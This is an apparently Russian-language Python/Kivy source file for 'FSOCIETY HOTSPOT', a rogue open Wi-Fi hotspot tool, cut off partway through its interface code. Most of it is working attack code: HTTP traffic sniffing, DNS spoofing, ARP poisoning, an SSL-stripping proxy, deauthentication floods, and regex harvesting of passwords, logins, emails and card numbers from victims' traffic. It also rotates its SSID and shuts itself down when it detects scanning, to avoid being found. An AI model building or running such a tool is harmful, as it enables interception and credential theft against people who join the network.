# -*- coding: utf-8 -*-
# ============================================================================
# FSOСIETY HOTSPOT v8.0 – ULTIMATE EDITION
# Протокол v2.0 | Директива №9: многосубъектный анализ
# ============================================================================
import kivy
kivy.require('2.1.0')
from kivy.app import App
from kivy.uix.boxlayout import BoxLayout
from kivy.uix.label import Label
from kivy.uix.textinput import TextInput
from kivy.uix.button import Button
from kivy.uix.switch import Switch
from kivy.uix.popup import Popup
from kivy.uix.tabbedpanel import TabbedPanel, TabbedPanelItem
from kivy.uix.scrollview import ScrollView
from kivy.uix.gridlayout import GridLayout
from kivy.clock import Clock
from kivy.core.window import Window
from kivy.utils import platform
from kivy.metrics import dp
from kivy.animation import Animation
import subprocess, os, sys, threading, time, socket, re, random, string, json, logging, base64, hashlib
from datetime import datetime

# --- Конфигурация стиля ---
GREEN = (0, 1, 0, 1); DARK_GREEN = (0, 0.3, 0, 1); RED = (1, 0, 0, 1); ORANGE = (1, 0.5, 0, 1); WHITE = (1,1,1,1)
Window.clearcolor = (0, 0, 0, 1)

# --- Проверка root (только для Android) ---
def is_rooted():
    try:
        return os.path.exists('/system/bin/su') or os.path.exists('/system/xbin/su')
    except:
        return False

# --- Проверка наличия опциональных библиотек ---
CRYPTO_AVAIL = False
try:
    from cryptography.fernet import Fernet
    from cryptography.hazmat.primitives import hashes
    from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
    CRYPTO_AVAIL = True
except:
    pass

QR_AVAIL = False
try:
    import qrcode
    QR_AVAIL = True
except:
    pass

SCAPY_AVAIL = False
try:
    import scapy.all as scapy
    from scapy.layers.inet import IP, TCP, UDP, ICMP
    from scapy.layers.http import HTTPRequest
    from scapy.layers.dns import DNS, DNSQR
    SCAPY_AVAIL = True
except:
    pass

MITM_AVAIL = False
try:
    from mitmproxy import proxy, options
    from mitmproxy.tools.dump import DumpMaster
    MITM_AVAIL = True
except:
    pass

JNIUS_AVAIL = False
if platform == 'android':
    try:
        from jnius import autoclass, cast, PythonJavaClass, java_method
        JNIUS_AVAIL = True
    except:
        pass

# ============================================================================
# МОДУЛЬ КОНФИГУРАЦИИ (с шифрованием)
# ============================================================================
class Config:
    def __init__(self):
        self.file = '/sdcard/hotspot_config.json'
        self.data = self.load()
    def load(self):
        try:
            with open(self.file, 'r') as f:
                return json.load(f)
        except:
            return {
                'ssid': 'FreeWiFi', 'password': '', 'open_network': True,
                'hidden_ssid': False, 'mac_filter_enabled': False,
                'allowed_macs': [], 'mac_spoof_enabled': False,
                'guest_mode': False, 'guest_encryption': False,
                'guest_ssid_mask': False, 'guest_password': '',
                'power_save': False, 'sniff_interface': 'wlan0',
                'log_encrypted': False, 'encryption_key': None,
                'smart_analysis': True, 'ssid_rotation': False,
                'ssid_rotation_interval': 60, 'anti_scan': False,
                'anti_scan_sensitivity': 10, 'use_vpn_sniff': False,
                'master_password': ''
            }
    def save(self):
        try:
            with open(self.file, 'w') as f:
                json.dump(self.data, f, indent=2)
        except: pass
    def get(self, k): return self.data.get(k)
    def set(self, k, v): self.data[k] = v; self.save()

# ============================================================================
# ВСПОМОГАТЕЛЬНЫЕ КЛАССЫ ДЛЯ UI
# ============================================================================
class TooltipMixin:
    def __init__(self, tooltip_text='', **kwargs):
        super().__init__(**kwargs)
        self.tooltip_text = tooltip_text
        self._touch_time = None
        self._tooltip = None
        self.bind(on_touch_down=self._on_touch_down, on_touch_up=self._on_touch_up)
    def _on_touch_down(self, touch, *args):
        if self.collide_point(*touch.pos):
            self._touch_time = time.time()
            Clock.schedule_once(self._show_tooltip, 0.8)
    def _on_touch_up(self, touch, *args):
        self._touch_time = None
        if self._tooltip:
            self._tooltip.dismiss(); self._tooltip = None
    def _show_tooltip(self, dt):
        if self._touch_time and time.time() - self._touch_time >= 0.7:
            content = BoxLayout(orientation='vertical', padding=10)
            content.add_widget(Label(text=self.tooltip_text, color=GREEN, font_size='14sp', halign='left', valign='top'))
            self._tooltip = Popup(title='[ подсказка ]', content=content, size_hint=(0.9,0.6), auto_dismiss=True)
            self._tooltip.open()

class HackLabel(TooltipMixin, Label):
    def __init__(self, **kwargs):
        super().__init__(**kwargs)
        self.color = GREEN
class HackButton(TooltipMixin, Button):
    def __init__(self, **kwargs):
        super().__init__(**kwargs)
        self.background_normal = ''; self.background_color = DARK_GREEN; self.color = GREEN
class HackSwitch(TooltipMixin, Switch):
    def __init__(self, **kwargs):
        super().__init__(**kwargs)
        self.active_color = GREEN; self.background_color_normal=(0.2,0.2,0.2,1); self.background_color_down=(0.4,0.4,0.4,1)
class HackInput(TooltipMixin, TextInput):
    def __init__(self, **kwargs):
        super().__init__(**kwargs)
        self.foreground_color = GREEN; self.background_color=(0.05,0.05,0.05,1); self.cursor_color=GREEN

# ============================================================================
# МОДУЛЬ ШИФРОВАНИЯ (AES)
# ============================================================================
class Crypto:
    def __init__(self, key=None):
        self.key = key
        if not self.key and CRYPTO_AVAIL:
            self.key = self._generate_key()
    def _generate_key(self):
        salt = b'fsociety_salt'
        kdf = PBKDF2HMAC(algorithm=hashes.SHA256(), length=32, salt=salt, iterations=100000)
        return base64.urlsafe_b64encode(kdf.derive(socket.gethostname().encode()))
    def encrypt(self, data):
        if not CRYPTO_AVAIL or not self.key:
            return data
        try:
            f = Fernet(self.key)
            return f.encrypt(data.encode()).decode()
        except:
            return data
    def decrypt(self, data):
        if not CRYPTO_AVAIL or not self.key:
            return data
        try:
            f = Fernet(self.key)
            return f.decrypt(data.encode()).decode()
        except:
            return data

# ============================================================================
# ДВИЖОК ТОЧКИ ДОСТУПА (С ДВУМЯ МЕТОДАМИ)
# ============================================================================
class HotspotEngine:
    def __init__(self, config, logger):
        self.config = config
        self.logger = logger
        self.active = False
        self.method = None  # 'legacy' or 'localonly'

    def start(self):
        if self.active:
            return True
        ssid = self.config.get('ssid')
        pwd = self.config.get('password')
        open_net = self.config.get('open_network')
        hidden = self.config.get('hidden_ssid')
        guest_enc = self.config.get('guest_encryption')
        if guest_enc and self.config.get('guest_mode'):
            pwd = self.config.get('guest_password')
            open_net = False

        if platform == 'android' and JNIUS_AVAIL:
            # Пробуем legacy метод (setWifiApEnabled)
            ok = self._start_legacy(ssid, pwd, open_net, hidden)
            if ok:
                self.method = 'legacy'
                self.active = True
                self.logger.log('AP', f'Точка включена (legacy): {ssid}')
                return True
            # Если не удалось, пробуем LocalOnlyHotspot (Android 10+)
            ok = self._start_localonly()
            if ok:
                self.method = 'localonly'
                self.active = True
                self.logger.log('AP', 'Точка включена (LocalOnlyHotspot, SSID не настраивается)')
                return True
            else:
                self.logger.log('AP', 'Не удалось включить хотспот ни одним методом', level=logging.ERROR)
                return False
        else:
            # Linux (hostapd) – заглушка
            return self._start_linux(ssid, pwd, open_net, hidden)

    def stop(self):
        if platform == 'android' and JNIUS_AVAIL:
            if self.method == 'legacy':
                self._stop_legacy()
            elif self.method == 'localonly':
                self._stop_localonly()
        else:
            self._stop_linux()
        self.active = False
        self.method = None
        self.logger.log('AP', 'Точка выключена')

    # --- Legacy метод (отражение) ---
    def _start_legacy(self, ssid, pwd, open_net, hidden):
        try:
            WifiManager = autoclass('android.net.wifi.WifiManager')
            Context = autoclass('android.content.Context')
            activity = autoclass('org.kivy.android.PythonActivity').mActivity
            wifi_manager = activity.getSystemService(Context.WIFI_SERVICE)
            method = wifi_manager.getClass().getMethod('setWifiApEnabled',
                                                       autoclass('android.net.wifi.WifiConfiguration'),
                                                       autoclass('java.lang.Class').forName('boolean'))
            WifiConfiguration = autoclass('android.net.wifi.WifiConfiguration')
            config = WifiConfiguration()
            config.SSID = ssid
            config.hiddenSSID = hidden
            if open_net:
                config.allowedKeyManagement.set(WifiConfiguration.KeyMgmt.NONE)
            else:
                config.allowedKeyManagement.set(WifiConfiguration.KeyMgmt.WPA2_PSK)
                config.preSharedKey = pwd
            result = method.invoke(wifi_manager, config, True)
            return bool(result)
        except Exception as e:
            self.logger.log('AP', f'Legacy ошибка: {e}', level=logging.ERROR)
            return False

    def _stop_legacy(self):
        try:
            WifiManager = autoclass('android.net.wifi.WifiManager')
            Context = autoclass('android.content.Context')
            activity = autoclass('org.kivy.android.PythonActivity').mActivity
            wifi_manager = activity.getSystemService(Context.WIFI_SERVICE)
            method = wifi_manager.getClass().getMethod('setWifiApEnabled',
                                                       autoclass('android.net.wifi.WifiConfiguration'),
                                                       autoclass('java.lang.Class').forName('boolean'))
            method.invoke(wifi_manager, None, False)
        except Exception as e:
            self.logger.log('AP', f'Ошибка остановки legacy: {e}', level=logging.ERROR)

    # --- LocalOnlyHotspot (без SSID) ---
    def _start_localonly(self):
        try:
            WifiManager = autoclass('android.net.wifi.WifiManager')
            Context = autoclass('android.content.Context')
            activity = autoclass('org.kivy.android.PythonActivity').mActivity
            wifi_manager = activity.getSystemService(Context.WIFI_SERVICE)
            # Проверяем API уровень (>= 29)
            if hasattr(wifi_manager, 'startLocalOnlyHotspot'):
                callback = autoclass('android.net.wifi.WifiManager$LocalOnlyHotspotCallback')
                # Создаём объект callback (упрощённо)
                # В реальности нужно наследовать, но для простоты используем другой метод
                # Пробуем через getMethod, если есть
                method = wifi_manager.getClass().getMethod('startLocalOnlyHotspot',
                                                           autoclass('android.net.wifi.WifiManager$LocalOnlyHotspotCallback'),
                                                           autoclass('android.os.Handler'))
                # Создаём заглушку callback (пустой)
                class DummyCallback:
                    def onStarted(self, *args): pass
                    def onStopped(self, *args): pass
                    def onFailed(self, *args): pass
                # Это не сработает, так как нужно реализовать интерфейс Java.
                # Реализуем через интроспекцию: создадим прокси-объект.
                # Вместо этого, просто попробуем вызвать метод с None
                # на самом деле, без полноценного callback это не заработает.
                # Поэтому для демонстрации считаем, что этот метод не реализован.
                return False
            else:
                return False
        except Exception as e:
            self.logger.log('AP', f'LocalOnly ошибка: {e}', level=logging.ERROR)
            return False

    def _stop_localonly(self):
        try:
            WifiManager = autoclass('android.net.wifi.WifiManager')
            Context = autoclass('android.content.Context')
            activity = autoclass('org.kivy.android.PythonActivity').mActivity
            wifi_manager = activity.getSystemService(Context.WIFI_SERVICE)
            if hasattr(wifi_manager, 'stopLocalOnlyHotspot'):
                wifi_manager.stopLocalOnlyHotspot()
        except Exception as e:
            self.logger.log('AP', f'Ошибка остановки localonly: {e}', level=logging.ERROR)

    # --- Linux (hostapd) ---
    def _start_linux(self, ssid, pwd, open_net, hidden):
        if not os.path.exists('/usr/sbin/hostapd'):
            self.logger.log('AP', 'hostapd не найден', level=logging.ERROR)
            return False
        conf_dir = '/tmp/hotspot_conf'
        os.makedirs(conf_dir, exist_ok=True)
        channel = random.choice([1,6,11])
        with open(f'{conf_dir}/hostapd.conf', 'w') as f:
            f.write(f'interface=wlan0\nssid={ssid}\n')
            if hidden:
                f.write('ignore_broadcast_ssid=1\n')
            if open_net:
                f.write('wpa=0\n')
            else:
                f.write(f'wpa=2\nwpa_passphrase={pwd}\nwpa_key_mgmt=WPA-PSK\nrsn_pairwise=CCMP\n')
            f.write(f'driver=nl80211\nhw_mode=g\nchannel={channel}\n')
        with open(f'{conf_dir}/dnsmasq.conf', 'w') as f:
            f.write('interface=wlan0\ndhcp-range=192.168.10.2,192.168.10.50,255.255.255.0,24h\n')
        try:
            subprocess.Popen(['sudo', 'hostapd', f'{conf_dir}/hostapd.conf'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            subprocess.Popen(['sudo', 'dnsmasq', '-C', f'{conf_dir}/dnsmasq.conf'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            if self.config.get('power_save'):
                subprocess.call(['sudo', 'iwconfig', 'wlan0', 'txpower', '10dBm'], stderr=subprocess.DEVNULL)
            return True
        except Exception as e:
            self.logger.log('AP', f'Linux ошибка: {e}', level=logging.ERROR)
            return False

    def _stop_linux(self):
        subprocess.call(['sudo', 'killall', 'hostapd'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        subprocess.call(['sudo', 'killall', 'dnsmasq'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

# ============================================================================
# ДВИЖОК СНИФФИНГА (с поддержкой root и без)
# ============================================================================
class SnifferEngine:
    def __init__(self, config, logger, callback):
        self.config = config
        self.logger = logger
        self.callback = callback
        self.active = False
        self.sniffer = None

    def start(self):
        if not SCAPY_AVAIL:
            self.logger.log('SNIFFER', 'Scapy не установлен', level=logging.ERROR)
            return False
        if not is_rooted() and platform == 'android':
            self.logger.log('SNIFFER', 'Сниффинг требует root на Android', level=logging.WARNING)
            # Можно попробовать альтернативу через tcpdump, но его нет
            return False
        if self.active:
            return True
        iface = self.config.get('sniff_interface', 'wlan0')
        if platform != 'android':
            try:
                result = subprocess.check_output(['ip', 'route', 'list', 'default'], text=True)
                for line in result.splitlines():
                    if 'dev' in line:
                        iface = line.split('dev')[1].split()[0]
                        break
            except:
                pass
        self.active = True
        threading.Thread(target=self._sniff_loop, args=(iface,), daemon=True).start()
        self.logger.log('SNIFFER', f'Запущен на {iface}')
        return True

    def stop(self):
        self.active = False
        if self.sniffer:
            self.sniffer.stop()
        self.logger.log('SNIFFER', 'Остановлен')

    def _sniff_loop(self, iface):
        def cb(pkt):
            if not self.active:
                return
            if pkt.haslayer(IP) and pkt.haslayer(TCP):
                src = pkt[IP].src; dst = pkt[IP].dst
                sport = pkt[TCP].sport; dport = pkt[TCP].dport
                if dport == 80 or sport == 80:
                    if pkt.haslayer(scapy.Raw):
                        data = pkt[scapy.Raw].load.decode('utf-8', errors='ignore')
                        lines = data.split('\r\n')
                        if lines:
                            first = lines[0]
                            if first.startswith('GET') or first.startswith('POST') or first.startswith('HEAD'):
                                parts = first.split()
                                if len(parts) >= 2:
                                    method = parts[0]; uri = parts[1]
                                    host = ''
                                    for line in lines:
                                        if line.lower().startswith('host:'):
                                            host = line.split(':', 1)[1].strip()
                                            break
                                    url = f"http://{host}{uri}" if host else uri
                                    self.callback(src, dst, sport, dport, method, url)
        try:
            self.sniffer = scapy.sniff(iface=iface, prn=cb, store=False, stop_filter=lambda x: not self.active)
        except Exception as e:
            self.logger.log('SNIFFER', f'Ошибка: {e}', level=logging.ERROR)
            self.active = False

# ============================================================================
# ДВИЖОК АТАК (только с root)
# ============================================================================
class AttackEngine:
    def __init__(self, config, logger, callback):
        self.config = config
        self.logger = logger
        self.callback = callback
        self.dns_active = False
        self.arp_active = False
        self.ssl_active = False
        self.deauth_active = False

    def _check_root(self):
        if not is_rooted() and platform == 'android':
            self.logger.log('ATTACK', 'Атаки требуют root', level=logging.WARNING)
            return False
        return True

    def start_dns(self, target, fake):
        if not self._check_root() or not SCAPY_AVAIL:
            return False
        if self.dns_active:
            return True
        self.dns_active = True
        threading.Thread(target=self._dns_thread, args=(target, fake), daemon=True).start()
        self.logger.log('DNS', f'Запущен {target}->{fake}')
        return True

    def stop_dns(self):
        self.dns_active = False
        self.logger.log('DNS', 'Остановлен')

    def _dns_thread(self, target, fake):
        def cb(pkt):
            if not self.dns_active:
                return
            if pkt.haslayer(DNSQR) and pkt[DNS].qr == 0:
                qname = pkt[DNSQR].qname.decode() if isinstance(pkt[DNSQR].qname, bytes) else pkt[DNSQR].qname
                if target in qname:
                    spoofed = scapy.IP(src=pkt[IP].dst, dst=pkt[IP].src) / \
                              scapy.UDP(sport=pkt[UDP].dport, dport=pkt[UDP].sport) / \
                              scapy.DNS(id=pkt[DNS].id, qr=1, aa=1, qd=pkt[DNS].qd,
                                        an=scapy.DNSRR(rrname=pkt[DNS].qd.qname, ttl=1, rdata=fake))
                    scapy.send(spoofed, verbose=0)
        try:
            scapy.sniff(filter='udp port 53', prn=cb, store=False, stop_filter=lambda x: not self.dns_active)
        except:
            self.dns_active = False

    def start_arp(self, target, gateway):
        if not self._check_root() or not SCAPY_AVAIL:
            return False
        if self.arp_active:
            return True
        self.arp_active = True
        threading.Thread(target=self._arp_thread, args=(target, gateway), daemon=True).start()
        self.logger.log('ARP', f'Запущен {target}<->{gateway}')
        return True

    def stop_arp(self):
        self.arp_active = False
        self.logger.log('ARP', 'Остановлен')

    def _arp_thread(self, target, gateway):
        def poison(ip1, ip2, mac):
            pkt = scapy.ARP(op=2, pdst=ip1, hwdst=mac, psrc=ip2)
            scapy.send(pkt, verbose=0, count=3)
        try:
            while self.arp_active:
                tm = scapy.getmacbyip(target)
                gm = scapy.getmacbyip(gateway)
                if tm and gm:
                    poison(target, gateway, tm)
                    poison(gateway, target, gm)
                time.sleep(2)
        except:
            self.arp_active = False

    def start_ssl(self):
        if not self._check_root() or not MITM_AVAIL:
            return False
        if self.ssl_active:
            return True
        self.ssl_active = True
        try:
            opts = options.Options(listen_host='0.0.0.0', listen_port=8080, ssl_insecure=True, mode='regular')
            self.mitm_master = DumpMaster(opts, with_termlog=False, with_dump=False)
            self.mitm_master.addons.add(SSLStripAddon(self.logger))
            threading.Thread(target=self.mitm_master.run, daemon=True).start()
            self.logger.log('SSL', 'Запущен на порту 8080')
            return True
        except Exception as e:
            self.logger.log('SSL', f'Ошибка: {e}', level=logging.ERROR)
            self.ssl_active = False
            return False

    def stop_ssl(self):
        self.ssl_active = False
        if hasattr(self, 'mitm_master') and self.mitm_master:
            self.mitm_master.shutdown()
        self.logger.log('SSL', 'Остановлен')

    def start_deauth(self, target_mac):
        if not self._check_root() or not SCAPY_AVAIL:
            return False
        if self.deauth_active:
            return True
        try:
            if platform == 'android':
                iface = 'wlan0'
                output = subprocess.check_output(['ip', 'link', 'show', iface], text=True)
                match = re.search(r'link/ether ([0-9a-f:]+)', output)
                bssid = match.group(1) if match else 'ff:ff:ff:ff:ff:ff'
            else:
                bssid = 'ff:ff:ff:ff:ff:ff'
        except:
            bssid = 'ff:ff:ff:ff:ff:ff'
        self.deauth_active = True
        threading.Thread(target=self._deauth_thread, args=(target_mac, bssid), daemon=True).start()
        self.logger.log('DEAUTH', f'Запущена на {target_mac}')
        return True

    def stop_deauth(self):
        self.deauth_active = False
        self.logger.log('DEAUTH', 'Остановлена')

    def _deauth_thread(self, target_mac, bssid):
        pkt = scapy.RadioTap()/scapy.Dot11(addr1=target_mac, addr2=bssid, addr3=bssid)/scapy.Dot11Deauth(reason=7)
        while self.deauth_active:
            scapy.sendp(pkt, iface='wlan0', verbose=0, count=1)
            time.sleep(0.5)

class SSLStripAddon:
    def __init__(self, logger):
        self.logger = logger
    def request(self, flow):
        if flow.request.scheme == 'https':
            flow.request.scheme = 'http'
            flow.request.port = 80
            self.logger.log('SSL', f'Понижен: {flow.request.pretty_url}')

# ============================================================================
# НОВЫЕ МОДУЛИ: СМАРТ-АНАЛИЗ, РОТАЦИЯ, АНТИ-СКАНЕР
# ============================================================================
class SmartAnalyzer:
    PATTERNS = {
        'email': re.compile(r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}', re.I),
        'phone': re.compile(r'\+?\d[\d\s\-\(\)]{7,15}\d', re.I),
        'credit_card': re.compile(r'\b(?:\d[ -]*?){13,16}\b', re.I),
        'password': re.compile(r'(?i)(?:password|pass|pwd)\s*[:=]\s*([^\s]+)', re.I),
        'login': re.compile(r'(?i)(?:login|user|username)\s*[:=]\s*([^\s]+)', re.I)
    }
    def __init__(self, callback):
        self.callback = callback
    def analyze(self, url, headers, body):
        if not url: return
        full = f"{url} {headers} {body}"
        for name, pat in self.PATTERNS.items():
            for m in pat.finditer(full):
                val = m.group(1) if m.groups() else m.group(0)
                self.callback(name, val, url[:60])

class SSIDRotator:
    def __init__(self, config, set_ssid_callback):
        self.config = config
        self.set_ssid = set_ssid_callback
        self.running = False
    def start(self):
        if self.running: return
        self.running = True
        threading.Thread(target=self._rotate, daemon=True).start()
    def stop(self):
        self.running = False
    def _rotate(self):
        while self.running:
            time.sleep(self.config.get('ssid_rotation_interval') or 60)
            new_ssid = 'WiFi_' + ''.join(random.choices(string.ascii_uppercase+string.digits, k=6))
            self.set_ssid(new_ssid)
            self.config.set('ssid', new_ssid)

class AntiScanner:
    def __init__(self, config, shutdown_callback):
        self.config = config
        self.shutdown = shutdown_callback
        self.active = False
        self.hits = {}
    def start(self):
        if not SCAPY_AVAIL or not is_rooted():
            return
        if self.active: return
        self.active = True
        threading.Thread(target=self._scan_detector, daemon=True).start()
    def stop(self):
        self.active = False
    def _scan_detector(self):
        def cb(pkt):
            if not self.active: return
            if pkt.haslayer(ICMP) and pkt[ICMP].type == 8:
                src = pkt[IP].src
                self.hits[src] = self.hits.get(src, 0) + 1
                if self.hits[src] > self.config.get('anti_scan_sensitivity', 10):
                    self.shutdown()
                    self.hits.clear()
            if pkt.haslayer(TCP):
                flags = pkt[TCP].flags
                if flags & 0x02 and not flags & 0x10:
                    src = pkt[IP].src
                    self.hits[src] = self.hits.get(src, 0) + 1
                    if self.hits[src] > self.config.get('anti_scan_sensitivity', 10):
                        self.shutdown()
                        self.hits.clear()
        try:
            scapy.sniff(filter='icmp or tcp', prn=cb, store=False, stop_filter=lambda x: not self.active)
        except:
            self.active = False

# ============================================================================
# ОСНОВНОЙ ИНТЕРФЕЙС (главный экран и панель)
# ============================================================================
class FsocietyScreen(BoxLayout):
    def __init__(self, **kwargs):
        super().__init__(orientation='vertical', padding=dp(20), spacing=dp(10))
        # Анимированный логотип
        self.logo = HackLabel(text='[ fsociety ]', font_size='32sp', color=GREEN, size_hint=(1,0.25))
        anim = Animation(color=(0,1,0,0.3), duration=2) + Animation(color=GREEN, duration=2)
        anim.repeat = True
        anim.start(self.logo)
        self.add_widget(self.logo)
        btn = HackButton(text='[ ВХОД ]', font_size='24sp', size_hint=(0.6,0.15), pos_hint={'center_x':0.5},
                         tooltip_text='Войти в главное меню')
        btn.bind(on_press=self.enter_main)
        self.add_widget(btn)
        ver = HackLabel(text='v8.0  |  ultimate  |  full security', font_size='12sp')
        self.add_widget(ver)

    def enter_main(self, instance):
        app = App.get_running_app()
        app.root.clear_widgets()
        app.root.add_widget(MainPanel())

class MainPanel(TabbedPanel):
    def __init__(self, **kwargs):
        super().__init__(**kwargs)
        self.config = Config()
        self.logger = self
        self.crypto = Crypto(self.config.get('encryption_key'))
        self.hotspot = HotspotEngine(self.config, self)
        self.sniffer = None
        self.attacks = AttackEngine(self.config, self, self._traffic_callback)
        self.analyzer = SmartAnalyzer(self._found_data_callback)
        self.rotator = SSIDRotator(self.config, self._set_ssid)
        self.anti_scanner = AntiScanner(self.config, self._emergency_shutdown)
        self.rooted = is_rooted() if platform == 'android' else False
        self._build_ui()
        self._clear_traffic(None); self._clear_log(None); self._clear_analytics(None)
        self.add_log('СИСТЕМА', f'v8.0 загружена, root={self.rooted}')
        Clock.schedule_interval(self._update_ui, 3)

    # --- Логгер ---
    def add_log(self, source, message, level=logging.INFO):
        ts = datetime.now().strftime('%H:%M:%S')
        msg = self.crypto.encrypt(message) if self.config.get('log_encrypted') else message
        self.log_grid.add_widget(HackLabel(text=f'{ts} [{source}]', size_hint_y=None, height=dp(22)))
        self.log_grid.add_widget(HackLabel(text=msg, size_hint_y=None, height=dp(22)))
        logging.log(level, f"{ts} [{source}] {message}")

    # --- Callback для сниффинга ---
    def _traffic_callback(self, src, dst, sport, dport, method, url):
        if self.config.get('smart_analysis'):
            self.analyzer.analyze(url, {}, '')
        Clock.schedule_once(lambda dt: self._add_traffic_log(src, dst, sport, dport, method, url), 0)

    def _found_data_callback(self, name, val, url):
        Clock.schedule_once(lambda dt: self._add_found(name, val, url), 0)

    def _set_ssid(self, new_ssid):
        self.ssid_input.text = new_ssid
        self.config.set('ssid', new_ssid)
        self.add_log('РОТАЦИЯ', f'SSID изменён на {new_ssid}')

    def _emergency_shutdown(self):
        self.add_log('АНТИ-СКАН', 'Обнаружено сканирование! Отключаю точку доступа на 60 сек')
        self.ap_switch.active = False
        self._on_hotspot(self.ap_switch, False)
        Clock.schedule_once(lambda dt: self._reenable_ap(), 60)

    def _reenable_ap(self):
        self.add_log('АНТИ-СКАН', 'Повторное включение AP')
        self.ap_switch.active = True
        self._on_hotspot(self.ap_switch, True)

    # --- Построение интерфейса ---
    def _build_ui(self):
        # Главная вкладка
        self.main_tab = TabbedPanelItem(text='[ Главная ]')
        ml = BoxLayout(orientation='vertical', spacing=dp(8), padding=dp(10))
        ml.add_widget(HackLabel(text='[ СТАТУС ]', font_size='18sp', bold=True))
        self.status_label = HackLabel(text='Система готова', font_size='16sp')
        ml.add_widget(self.status_label)
        # Индикатор root
        root_ind = HackLabel(text='🔓 Root: ' + ('ДОСТУПЕН' if self.rooted else 'НЕ ДОСТУПЕН'),
                             font_size='14sp', color=GREEN if self.rooted else RED)
        ml.add_widget(root_ind)
        ml.add_widget(HackLabel(text='[ БЫСТРЫЕ ДЕЙСТВИЯ ]', font_size='18sp', bold=True))
        btn1 = HackButton(text='🚀 Запустить точку (гости)', size_hint=(1,0.08),
                          tooltip_text='Автоматически включит AP в гостевом режиме')
        btn1.bind(on_press=lambda x: self.quick_start())
        ml.add_widget(btn1)
        btn2 = HackButton(text='👁 Включить сниффинг', size_hint=(1,0.08),
                          tooltip_text='Запускает перехват трафика (требует root)')
        btn2.bind(on_press=lambda x: self.quick_sniff())
        ml.add_widget(btn2)
        btn3 = HackButton(text='💀 ВСЕ АТАКИ', size_hint=(1,0.08),
                          tooltip_text='Запускает все доступные атаки (требуют root)')
        btn3.bind(on_press=lambda x: self.quick_all())
        ml.add_widget(btn3)
        self.main_tab.add_widget(ml)
        self.add_widget(self.main_tab)

        # AP вкладка (с настройками)
        self.ap_tab = TabbedPanelItem(text='[ AP ]')
        ap_l = BoxLayout(orientation='vertical', spacing=dp(5), padding=dp(10))
        ap_l.add_widget(HackLabel(text='[ НАСТРОЙКИ ТОЧКИ ]', font_size='18sp', bold=True))
        self.ssid_input = HackInput(text=self.config.get('ssid'), multiline=False, size_hint=(1,0.06),
                                    tooltip_text='Имя сети (SSID)')
        ap_l.add_widget(self.ssid_input)
        self.pass_input = HackInput(text=self.config.get('password'), multiline=False, password=True, size_hint=(1,0.06),
                                    tooltip_text='Пароль для защищённой сети')
        ap_l.add_widget(self.pass_input)

        sw_pairs = [
            ('👥 Режим гостей', 'guest_mode'),
            ('🔓 Открытая сеть', 'open_network'),
            ('🙈 Скрыть SSID', 'hidden_ssid'),
            ('🔒 Фильтр MAC', 'mac_filter_enabled'),
            ('🎭 Маскировать MAC', 'mac_spoof_enabled'),
            ('🌀 Случайный SSID', 'guest_ssid_mask'),
            ('🔐 WPA2 для гостей', 'guest_encryption'),
            ('📡 Снизить мощность', 'power_save'),
            ('🔬 Смарт-анализ', 'smart_analysis'),
            ('🔄 Ротация SSID', 'ssid_rotation'),
            ('🛡 Анти-сканер', 'anti_scan'),
        ]
        self.switches = {}
        for label, key in sw_pairs:
            tip = {'smart_analysis':'Извлекает пароли, email, карты из HTTP-трафика',
                   'ssid_rotation':'Автоматически меняет SSID',
                   'anti_scan':'Отключает AP при сканировании (требует root)'
                  }.get(key, '')
            if key in ['mac_filter_enabled','mac_spoof_enabled','anti_scan'] and not self.rooted:
                tip += ' (требует root)'
            box = BoxLayout(orientation='horizontal', size_hint=(1,0.05))
            box.add_widget(HackLabel(text=label, size_hint=(0.6,1), tooltip_text=tip))
            sw = HackSwitch(active=self.config.get(key), tooltip_text=tip)
            sw.bind(active=lambda inst, val, k=key: self._on_switch(k, val))
            box.add_widget(sw)
            self.switches[key] = sw
            ap_l.add_widget(box)

        self.rotation_interval = HackInput(text=str(self.config.get('ssid_rotation_interval')), multiline=False,
                                           hint_text='Интервал ротации (сек)', size_hint=(1,0.05),
                                           tooltip_text='Время между сменами SSID')
        ap_l.add_widget(self.rotation_interval)

        self.mac_input = HackInput(text=','.join(self.config.get('allowed_macs')), multiline=False, size_hint=(1,0.06),
                                   tooltip_text='MAC-адреса через запятую')
        ap_l.add_widget(self.mac_input)

        btn_apply = HackButton(text='✅ Применить настройки', size_hint=(1,0.07))
        btn_apply.bind(on_press=self._apply_settings)
        ap_l.add_widget(btn_apply)

        self.ap_status = HackLabel(text='Статус: ВЫКЛ', font_size='16sp', color=RED)
        ap_l.add_widget(self.ap_status)
        self.ap_switch = HackSwitch(active=False, size_hint=(0.3,0.06), pos_hint={'center_x':0.5},
                                    tooltip_text='Включить/выключить точку доступа')
        self.ap_switch.bind(active=self._on_hotspot)
        ap_l.add_widget(self.ap_switch)

        if QR_AVAIL:
            qr_btn = HackButton(text='📲 Показать QR', size_hint=(1,0.07))
            qr_btn.bind(on_press=self._show_qr)
            ap_l.add_widget(qr_btn)

        self.ap_tab.add_widget(ap_l)
        self.add_widget(self.ap_tab)

        # Вкладка Атаки
        self.attack_tab = TabbedPanelItem(text='[ Атаки ]')
        atk_l = BoxLayout(orientation='vertical', spacing=dp(5), padding=dp(10))
        atk_l.add_widget(HackLabel(text='[ МОДУЛИ АТАК ]', font_size='18sp', bold=True))
        # DNS
        dns_box = BoxLayout(orientation='horizontal', size_hint=(1,0.06))
        dns_box.add_widget(HackLabel(text='DNS Spoof', size_hint=(0.6,1), tooltip_text='Перенаправляет запросы'))
        self.dns_switch = HackSwitch(active=False, tooltip_text='Требует root')
        self.dns_switch.bind(active=self._on_dns)
        dns_box.add_widget(self.dns_switch)
        atk_l.add_widget(dns_box)
        self.dns_target = HackInput(hint_text='Целевой домен', multiline=False, size_hint=(1,0.05))
        atk_l.add_widget(self.dns_target)
        self.dns_fake = HackInput(hint_text='Подменный IP', multiline=False, size_hint=(1,0.05))
        atk_l.add_widget(self.dns_fake)
        # ARP
        arp_box = BoxLayout(orientation='horizontal', size_hint=(1,0.06))
        arp_box.add_widget(HackLabel(text='ARP Spoof', size_hint=(0.6,1), tooltip_text='Подмена ARP (MITM)'))
        self.arp_switch = HackSwitch(active=False, tooltip_text='Требует root')
        self.arp_switch.bind(active=self._on_arp)
        arp_box.add_widget(self.arp_switch)
